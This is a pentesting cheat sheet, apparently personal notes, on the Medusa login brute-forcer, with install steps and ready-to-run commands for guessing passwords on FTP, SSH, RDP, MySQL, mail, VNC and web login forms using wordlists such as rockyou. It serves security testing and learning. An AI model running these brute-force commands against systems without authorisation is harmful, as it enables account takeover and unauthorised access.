---
title: medusa 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - brute forcing
  - windows
  - passwords
---
# Medusa

Medusa is a speedy, parallel, and modular, login brute-forcer. The goal is to support as many services which allow remote authentication as possible. The author considers following items as some of the key features of this application:

## Installation 

Pre-installed in Kali.

```bash
wget http://www.foofus.net/jmk/tools/medusa-2.2.tar.gz
./configure
make
make install
```

Alternative install:

```bash
sudo apt-get -y update
sudo apt-get -y install medusa
```



## Basic usage


```bash
# Brute force FTP logging
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h $IP -M ftp -n 2121
# -u: username
# -U: list of Usernames
# -p: password
# -P: list of passwords
# -h: host /IP
# -M: protocol to bruteforce
# -n: for a different non-default port. For instance, port 2121 for ftp 


# -m Module options: Provide additional parameters required by the chosen module, enclosed in quotes.
medusa -M http -m "POST /login.php HTTP/1.1\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=^USER^&password=^PASS^" ...

# -t Tasks: Define the number of parallel login attempts to run, potentially speeding up the attack.	
medusa -t 4 ...

# -f or -F: Fast mode: Stop the attack after the first successful login is found, either on the current host (-f) or any host (-F).		
medusa -f ... or medusa -F ...

```


## Medusa modules


```bash
# Testing for Empty or Default Passwords
medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
# Perform additional checks for empty passwords (-e n) and passwords matching the username (-e s).
# Use the appropriate service module (replace service_name with the correct module name).


# FTP: File Transfer Protocol. Brute-forcing FTP login credentials, used for file transfers over a network.	
medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt


# HTTP: Hypertext Transfer Protocol. Brute-forcing login forms on web applications over HTTP (GET/POST).	
medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^

# IMAP: Internet Message Access Protocol. Brute-forcing IMAP logins, often used to access email servers.	
medusa -M imap -h mail.example.com -U users.txt -P passwords.txt

# MySQL: MySQL Database. Brute-forcing MySQL database credentials, commonly used for web applications and databases.	
medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt

# POP3: Post Office Protocol 3. Brute-forcing POP3 logins, typically used to retrieve emails from a mail server.	
medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt


# RDP: Remote Desktop Protocol. Brute-forcing RDP logins, commonly used for remote desktop access to Windows systems.	
medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt

# SSHv2: Secure Shell (SSH). Brute-forcing SSH logins, commonly used for secure remote access.	
medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt

# Subversion (SVN): Version Control System. Brute-forcing Subversion (SVN) repositories for version control.	
medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt

# Telnet: Telnet Protocol. Brute-forcing Telnet services for remote command execution on older systems.	
medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt

# VNC: Virtual Network Computing. Brute-forcing VNC login credentials for remote desktop access.	
medusa -M vnc -h 192.168.1.100 -P passwords.txt

# Web Form: Brute-forcing Web Login Forms. Brute-forcing login forms on websites using HTTP POST requests.	
medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"

# Targeting Multiple Web Servers with Basic HTTP Authentication
medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET 
```

